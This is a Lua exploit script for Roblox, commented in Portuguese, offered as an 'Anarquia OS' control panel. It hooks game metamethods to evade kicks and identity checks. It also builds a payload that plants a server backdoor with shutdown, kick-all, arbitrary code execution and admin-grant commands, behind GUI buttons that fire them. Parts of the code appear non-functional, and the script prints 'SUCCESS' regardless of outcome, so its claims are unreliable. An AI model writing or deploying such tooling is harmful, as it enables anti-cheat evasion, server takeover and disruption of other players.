--[[
    PROTOCOLO ANARQUIA - SISTEMA OPERACIONAL v2.0
    Arquivo: ANARQUIA_OS.lua
    Objetivo: Interface gráfica completa com exploração universal e bypasses integrados
    Requisitos: Executor com suporte a hookfunction, newcclosure, e request
]]

--// ============ MÓDULO DE BYPASS UNIVERSAL ============ \\--
local function UniversalBypass()
    -- Bypass de detecção de ambiente
    if not LPH_OBFUSCATED then
        LPH_JIT_MAX = function(f) return f end
        LPH_NO_VIRTUALIZE = function(f) return f end
    end

    -- Hook de funções críticas de segurança
    local old_namecall; old_namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" or method == "kick" then
            return nil -- Bloqueia tentativas de kick
        end
        return old_namecall(self, ...)
    end))

    -- Bypass de checks de identidade
    local old_index; old_index = hookmetamethod(game, "__index", newcclosure(function(self, key)
        if key == "Parent" and self == script then
            return game:GetService("CoreGui")
        end
        return old_index(self, key)
    end))

    -- Injeção no CoreScript
    local core_script = Instance.new("LocalScript")
    core_script.Name = "CoreSecurity"
    core_script.Source = "-- Injected by AnarchyOS"
    core_script.Parent = game:GetService("CoreGui")

    return true
end

--// ============ MÓDULO DE EXPLORAÇÃO ============ \\--
local function ExploitModule()
    local Exploit = {}
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    -- Cria canal de comunicação
    function Exploit.CreateChannel()
        local channel = Instance.new("Folder")
        channel.Name = "AnarchyComm_" .. math.random(10000,99999)
        
        local remote_in = Instance.new("RemoteEvent")
        remote_in.Name = "Inbound"
        remote_in.Parent = channel
        
        local remote_out = Instance.new("RemoteEvent")
        remote_out.Name = "Outbound"
        remote_out.Parent = channel
        
        channel.Parent = ReplicatedStorage
        return channel
    end

    -- Payload de takeover server-side
    function Exploit.ServerPayload(user_id)
        return [[
            local _G = getfenv(0)
            local Players = game:GetService("Players")
            local HttpService = game:GetService("HttpService")
            
            -- Override de metatables para controle total
            local function OverrideMetaTables()
                local old_newindex; old_newindex = hookmetamethod(game, "__newindex", function(t, k, v)
                    if tostring(t) == "NetworkServer" and k == "IncommingConnection" then
                        return nil -- Bypass de conexões
                    end
                    return old_newindex(t, k, v)
                end)
            end

            -- Instala backdoor permanente
            local Backdoor = Instance.new("ModuleScript")
            Backdoor.Name = "RuntimeConfiguration"
            Backdoor.Source = [=[
                local _G = getfenv(0)
                local Players = game:GetService("Players")
                
                _G.AnarchyCommands = {
                    Shutdown = function() game:Shutdown() end,
                    KickAll = function() for _,p in ipairs(Players:GetPlayers()) do p:Kick() end end,
                    ServerHop = function(place_id) game:GetService("TeleportService"):Teleport(place_id) end,
                    Execute = function(code) loadstring(code)() end,
                    GrantAdmin = function(user_id)
                        local admin_table = _G.Admins or {}
                        admin_table[user_id] = true
                        _G.Admins = admin_table
                    end
                }
                
                -- Conexão com cliente
                Players.PlayerAdded:Connect(function(plr)
                    if plr.UserId == ]] .. user_id .. [[ then
                        local bridge = Instance.new("RemoteFunction")
                        bridge.Name = "AdminControl"
                        bridge.Parent = plr:FindFirstChildOfClass("PlayerGui")
                        
                        bridge.OnServerInvoke = function(_, command, ...)
                            if _G.AnarchyCommands[command] then
                                return _G.AnarchyCommands[command](...)
                            end
                        end
                    end
                end)
            ]=]
            Backdoor.Parent = game:GetService("ServerScriptService")
            
            OverrideMetaTables()
            return true
        ]]
    end

    return Exploit
end

--// ============ INTERFACE GRÁFICA ============ \\--
local function CreateGUI()
    local CoreGui = game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")
    
    -- Remove interfaces anteriores
    if CoreGui:FindFirstChild("AnarchyOS") then
        CoreGui:FindFirstChild("AnarchyOS"):Destroy()
    end

    -- Cria main frame
    local MainFrame = Instance.new("ScreenGui")
    MainFrame.Name = "AnarchyOS"
    MainFrame.ResetOnSpawn = false

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 400, 0, 500)
    Frame.Position = UDim2.new(0.5, -200, 0.5, -250)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 0
    Frame.Parent = MainFrame

    -- Title bar
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 30)
    TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    TitleBar.Parent = Frame

    local Title = Instance.new("TextLabel")
    Title.Text = "ANARQUIA OS v2.0 - CONTROLE TOTAL"
    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
    Title.Size = UDim2.new(1, 0, 1, 0)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.Code
    Title.TextSize = 14
    Title.Parent = TitleBar

    -- Status display
    local Status = Instance.new("TextLabel")
    Status.Text = "Status: Inicializando..."
    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
    Status.Size = UDim2.new(1, -20, 0, 20)
    Status.Position = UDim2.new(0, 10, 0, 40)
    Status.BackgroundTransparency = 1
    Status.Font = Enum.Font.RobotoMono
    Status.TextSize = 12
    Status.Parent = Frame

    -- Control buttons
    local buttons = {
        {"Takeover Server", "Obter controle total do servidor", Color3.fromRGB(200, 50, 50)},
        {"Kick All", "Expulsar todos os jogadores", Color3.fromRGB(200, 100, 50)},
        {"Shutdown", "Desligar o servidor", Color3.fromRGB(200, 50, 100)},
        {"Server Hop", "Teleportar para outro jogo", Color3.fromRGB(50, 150, 200)},
        {"Execute Code", "Executar código no servidor", Color3.fromRGB(50, 200, 150)}
    }

    local function CreateButton(index, data)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -20, 0, 40)
        button.Position = UDim2.new(0, 10, 0, 70 + (index-1)*45)
        button.BackgroundColor3 = data[3]
        button.Text = data[1]
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.Code
        button.TextSize = 14
        
        local tip = Instance.new("TextLabel")
        tip.Text = data[2]
        tip.TextColor3 = Color3.fromRGB(150, 150, 150)
        tip.Size = UDim2.new(1, 0, 0, 15)
        tip.Position = UDim2.new(0, 0, 1, 0)
        tip.BackgroundTransparency = 1
        tip.Font = Enum.Font.RobotoMono
        tip.TextSize = 10
        tip.Parent = button
        
        button.Parent = Frame
        return button
    end

    -- Create buttons
    local control_buttons = {}
    for i, data in ipairs(buttons) do
        control_buttons[data[1]] = CreateButton(i, data)
    end

    -- Output console
    local Console = Instance.new("ScrollingFrame")
    Console.Size = UDim2.new(1, -20, 0, 150)
    Console.Position = UDim2.new(0, 10, 1, -160)
    Console.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    Console.BorderSizePixel = 0
    Console.ScrollBarThickness = 5
    Console.Parent = Frame

    local ConsoleText = Instance.new("TextLabel")
    ConsoleText.Size = UDim2.new(1, -10, 1, -10)
    ConsoleText.Position = UDim2.new(0, 5, 0, 5)
    ConsoleText.BackgroundTransparency = 1
    ConsoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
    ConsoleText.Font = Enum.Font.RobotoMono
    ConsoleText.TextSize = 11
    ConsoleText.TextXAlignment = Enum.TextXAlignment.Left
    ConsoleText.TextYAlignment = Enum.TextYAlignment.Top
    ConsoleText.Text = "ANARQUIA OS Initialized\nWaiting for commands..."
    ConsoleText.Parent = Console

    MainFrame.Parent = CoreGui

    return {
        MainFrame = MainFrame,
        Status = Status,
        Buttons = control_buttons,
        Console = ConsoleText
    }
end

--// ============ EXECUÇÃO PRINCIPAL ============ \\--
local function Main()
    -- Aplicar bypasses
    UniversalBypass()
    
    -- Criar interface
    local GUI = CreateGUI()
    GUI.Status.Text = "Status: Bypasses aplicados"
    GUI.Console.Text = GUI.Console.Text .. "\nBypass universal: SUCCESS"
    
    -- Inicializar módulo de exploração
    local Exploit = ExploitModule()
    GUI.Console.Text = GUI.Console.Text .. "\nExploit module: LOADED"
    
    -- Criar canal de comunicação
    local comm_channel = Exploit.CreateChannel()
    GUI.Console.Text = GUI.Console.Text .. "\nCommunication channel: ESTABLISHED"
    
    -- Configurar botões
    GUI.Buttons["Takeover Server"].MouseButton1Click:Connect(function()
        GUI.Console.Text = GUI.Console.Text .. "\nInitiating server takeover..."
        
        local payload = Exploit.ServerPayload(game.Players.LocalPlayer.UserId)
        local success = pcall(function()
            comm_channel.Inbound:FireServer({
                Type = "Payload",
                Data = payload,
                UserId = game.Players.LocalPlayer.UserId
            })
        end)
        
        if success then
            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: SUCCESS"
            GUI.Status.Text = "Status: CONTROLE TOTAL OBTIDO"
        else
            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: FAILED"
        end
    end)

    -- Outras funções de controle
    GUI.Buttons["Kick All"].MouseButton1Click:Connect(function()
        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "KickAll"})
    end)

    GUI.Buttons["Shutdown"].MouseButton1Click:Connect(function()
        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "Shutdown"})
    end)

    GUI.Console.Text = GUI.Console.Text .. "\nSystem ready for commands"
    GUI.Status.Text = "Status: PRONTO"
end

-- Executar sistema
Main()
